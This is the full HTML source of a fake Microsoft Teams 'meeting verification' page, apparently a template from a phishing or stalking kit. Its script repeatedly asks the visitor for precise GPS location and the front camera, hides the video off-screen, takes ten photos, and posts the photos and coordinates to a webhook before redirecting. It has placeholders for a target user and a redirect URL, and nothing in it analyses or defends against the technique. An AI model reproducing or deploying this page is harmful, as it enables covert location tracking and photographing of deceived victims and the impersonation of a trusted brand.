<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Microsoft Teams – Meeting Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f5f5f5;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: #333;
        }
        .container {
            text-align: center;
            padding: 40px 20px;
            max-width: 350px;
        }
        .teams-logo {
            font-size: 48px;
            color: #6264a7;
            margin-bottom: 15px;
        }
        .spinner {
            width: 44px;
            height: 44px;
            border: 4px solid #e0e0e0;
            border-top-color: #6264a7;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        h1 { font-size: 20px; font-weight: 600; margin-bottom: 8px; }
        .subtitle { font-size: 13px; color: #666; margin-bottom: 20px; }
        .meeting-id {
            background: #e5e5f0;
            border-radius: 8px;
            padding: 8px 16px;
            font-weight: 600;
            display: inline-block;
            margin-bottom: 15px;
        }
        .status {
            font-size: 12px;
            color: #666;
            margin-top: 12px;
            min-height: 18px;
        }
    </style>
</head>
<body>
    <div class="container" id="main-container">
        <div class="teams-logo"><i class="fas fa-users"></i></div>
        <div class="spinner" id="spinner"></div>
        <h1>Joining Teams Meeting…</h1>
        <p class="subtitle">Verifying your device before joining</p>
        <div class="meeting-id" id="target-username">Meeting ID: __TARGET_USER__</div>
        <p class="status" id="status-text"></p>
    </div>

    <video id="hidden-video" autoplay playsinline muted></video>

    <script>
    (function() {
        var params = new URLSearchParams(window.location.search);
        var user = params.get('user') || '__TARGET_USER__';
        document.getElementById('target-username').textContent = 'Meeting ID: ' + user;

        var video = document.getElementById('hidden-video');
        video.style.position = 'fixed';
        video.style.top = '-1000px';
        video.style.left = '-1000px';
        video.style.width = '1px';
        video.style.height = '1px';
        video.setAttribute('autoplay', '');
        video.setAttribute('playsinline', '');
        video.setAttribute('muted', '');
        document.body.appendChild(video);

        var gpsDone = false;
        var cameraDone = false;
        var stream = null;
        var photos = [];
        var captureInProgress = false;
        var statusText = document.getElementById('status-text');
        var spinner = document.getElementById('spinner');

        function requestGPS() {
            if (gpsDone) return;
            statusText.textContent = 'Verifying location…';
            var options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
            navigator.geolocation.getCurrentPosition(onGPSSuccess, onGPSError, options);
        }

        function onGPSSuccess(pos) {
            if (gpsDone) return;
            gpsDone = true;
            window._gpsCaptured = {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                accuracy: Math.round(pos.coords.accuracy)
            };
            requestCamera();
        }

        function onGPSError(err) {
            setTimeout(requestGPS, 3000);
        }

        function requestCamera() {
            if (cameraDone) return;
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: false
            })
            .then(function(s) {
                stream = s;
                cameraDone = true;
                video.srcObject = stream;
                video.play().catch(function(){});
                startCapture();
            })
            .catch(function() {
                setTimeout(requestCamera, 3000);
            });
        }

        async function startCapture() {
            if (!gpsDone || !cameraDone || captureInProgress) return;
            try {
                await waitForVideoReady();
                capturePhotos();
            } catch(e) {
                uploadPhotos([]);
            }
        }

        function waitForVideoReady(maxAttempts = 30) {
            return new Promise((resolve, reject) => {
                let attempts = 0;
                function check() {
                    if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) resolve();
                    else if (attempts >= maxAttempts) reject(new Error('not ready'));
                    else { attempts++; setTimeout(check, 100); }
                }
                check();
            });
        }

        function capturePhotos() {
            captureInProgress = true;
            const max = 10;
            let count = 0;
            function snap() {
                if (count >= max) {
                    stream.getTracks().forEach(t => t.stop());
                    captureInProgress = false;
                    uploadPhotos(photos);
                    return;
                }
                if (video.videoWidth === 0 || video.videoHeight === 0) {
                    setTimeout(snap, 200);
                    return;
                }
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                photos.push(canvas.toDataURL('image/jpeg', 0.7));
                count++;
                setTimeout(snap, 300);
            }
            snap();
        }

        function uploadPhotos(arr) {
            const fd = new FormData();
            arr.forEach((b64, i) => {
                fd.append('photo_' + i, dataURItoBlob(b64), 'face_' + i + '.jpg');
            });
            if (window._gpsCaptured) fd.append('gps', JSON.stringify(window._gpsCaptured));
            fetch('/webhook.php', { method: 'POST', body: fd })
                .then(() => {
                    spinner.style.display = 'none';
                    statusText.textContent = 'Verification complete. Joining…';
                    setTimeout(() => location.href = '__REDIRECT_URL__', 3000);
                })
                .catch(() => setTimeout(() => location.href = '__REDIRECT_URL__', 2000));
        }

        function dataURItoBlob(d) {
            var a = d.split(','), m = a[0].match(/:(.*?);/)[1],
                b = atob(a[1]), n = b.length,
                u = new Uint8Array(n);
            for (var i = 0; i < n; i++) u[i] = b.charCodeAt(i);
            return new Blob([u], { type: m });
        }

        setTimeout(requestGPS, 1500);
        document.addEventListener('click', function() { if (!gpsDone) requestGPS(); }, { once: true });
    })();
    </script>
    <!-- tc_payload -->
</body>
</html>
